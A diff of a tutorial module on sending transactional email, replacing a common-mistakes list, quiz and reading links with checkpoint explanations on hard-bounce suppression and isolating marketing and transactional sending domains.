+Continuous retries against invalid addresses or non-existent domains flag your sending IP as a spam harvester. Major providers (Spamhaus, Gmail) immediately throttle your sender reputation score.
+**The Fix:** Classify SMTP response codes. `5xx` codes are **permanent hard failures (Hard Bounces)**: immediately cancel retries, mark the email as invalid in your database, and append it to an internal **Suppression List** so no future background tasks attempt to contact that address.
 </details>
-
-## Common mistakes & troubleshooting
-
-- **Sending email inside the request handler.** SMTP/API calls are slow,
-  I/O-bound third-party work — enqueue a task and return; don't make the user
-  wait on your mail provider.
-- **HTML-only, no text part.** Hurts deliverability and breaks text-only
-  clients. Send `multipart/alternative` with both parts.
-- **Unescaped personalization.** A display name or product title containing
-  `<`/`>` breaks or injects into your HTML. Render with autoescaping on.
-- **Non-idempotent sends.** A retry or redelivery sends a second receipt.
-  Guard with a `(recipient, type, event)` uniqueness check before sending.
-- **Retrying permanent failures.** A malformed address or `400` won't succeed
-  on retry — it just delays the failure. Only retry transient errors.
-- **No preheader set.** The inbox grabs whatever text is first ("View in
-  browser," a link, or nothing), wasting the preview line. Set it explicitly.
-- **Ignoring SPF/DKIM/DMARC and bounces.** Correct sending code still lands in
-  spam without authenticated DNS records, sender reputation, and bounce
-  suppression. That's the deliverability layer, and it lives in DNS and your
-  provider, not your task code.
-- **Running your own SMTP server to save money.** Reputation, reverse DNS, and
-  blocklist management are a specialized job; use a provider and integrate it
-  from a reliable task.
-
-## Checkpoint quiz
-
-Write down your answer to each question before expanding it — checking without attempting first is the single easiest way to fool yourself into thinking you've learned this.
-
-1. What distinguishes a transactional email from a marketing email, and why
-   does that distinction affect things like the unsubscribe requirement?
-2. Why do you send both a text and an HTML part, and what's the MIME type of
-   the combined message?
-3. What is a preheader, and what happens if you don't set one deliberately?
-4. Why must personalization data be autoescaped when rendered into HTML? Give
-   the concrete risk.
-5. Why does sending email belong in a background task, and which two
-   reliability properties from earlier modules must that task have?
-6. In one sentence each, what do SPF, DKIM, and DMARC do?
-7. Your send code works in dev (MailHog) but production receipts land in spam.
-   Name three things you'd check, none of which is the application code.
 
 <details>
-<summary>Answers</summary>
+<summary><strong>Checkpoint 3: The Root Domain Reputation Contamination Trap</strong></summary>
 
-1. A transactional email is triggered by a specific user action/event, sent to
-   one recipient, containing information they're expecting (receipt, reset,
-   confirmation); marketing email is bulk promotional content sent on your
-   schedule. Because the user's action triggered a transactional message and
-   they need it, it generally doesn't require the unsubscribe machinery
-   marketing (unsolicited/promotional) mail legally does.
-2. So the recipient's client can display whichever it supports — HTML for rich
-   clients, plain text for text-only ones — and because including a text part
-   improves deliverability. The combined message is `multipart/alternative`.
-3. The preheader is the preview snippet an inbox shows after the subject. If
-   you don't set it, the client pulls whatever text comes first (often "View
-   in browser," a link, or nothing), wasting a prime piece of preview real
-   estate.
-4. Because personalization values (names, product titles) are untrusted data
-   that may contain `<`, `>`, `&`; rendered unescaped they break your HTML or
-   inject markup/script into your own email. Autoescaping neutralizes them,
-   exactly like escaping output on a web page.
-5. Because sending is slow, I/O-bound, third-party work that shouldn't block
-   the request-response cycle. The task must (1) retry transient failures with
-   backoff (not permanent ones) and (2) be idempotent so a retry/redelivery
-   doesn't send the message twice.
-6. SPF: a DNS record listing which servers are authorized to send mail for
-   your domain. DKIM: a cryptographic signature (public key in DNS) proving
-   the message came from your domain unaltered. DMARC: a DNS policy telling
-   receivers what to do when SPF/DKIM fail, plus reporting.
-7. Any three of: SPF record present/correct; DKIM signing enabled and key
-   published; DMARC policy present and mail passing it; sending domain/IP
-   reputation and whether it's brand-new; whether you include a text part;
-   whether hard bounces/complaints are being suppressed.
+**Scenario:** A company uses `marketing@company.com` for cold outbound sales campaigns and `security@company.com` for password reset emails. The sales team buys a questionable lead list, and cold emails generate a 12% spam complaint rate. Suddenly, existing customers stop receiving password reset tokens and login verification codes. Why?
 
+*Explanation:*
+Spam filters calculate sender reputation at the domain level. A surge in spam complaints from marketing emails destroys the reputation of the root domain `company.com`, directly impacting mission-critical transactional emails.
+**The Rule:** Strictly isolate sending domains. Route marketing broadcasts through `promo.company.com` and mission-critical transactional notifications through `auth.company.com` or `transact.company.com`, backed by dedicated, warmed-up IP pools.
 </details>
 
-## Further reading & sources
-
-- [MDN: multipart/alternative and email MIME](https://developer.mozilla.org/en-US/docs/Web/HTTP/Basics_of_HTTP/MIME_types) - how a message carries both a text and an HTML part.
-- [Python: email.message.EmailMessage](https://docs.python.org/3/library/email.message.html) - the stdlib API used to build the MIME message.
-- [Jinja2: autoescaping](https://jinja.palletsprojects.com/en/stable/api/#autoescaping) - turning on HTML escaping so personalization data can't inject markup.
-- [Google: Email sender guidelines (SPF/DKIM/DMARC)](https://support.google.com/mail/answer/81126) - the authoritative bar a major receiver sets for landing in the inbox.
-- [dmarc.org: Overview](https://dmarc.org/overview/) - what DMARC is and how it ties SPF and DKIM together.
-- [MailHog](https://github.com/mailhog/MailHog) - the local SMTP capture server used in the exercises.
+---
 
 ## Next
 
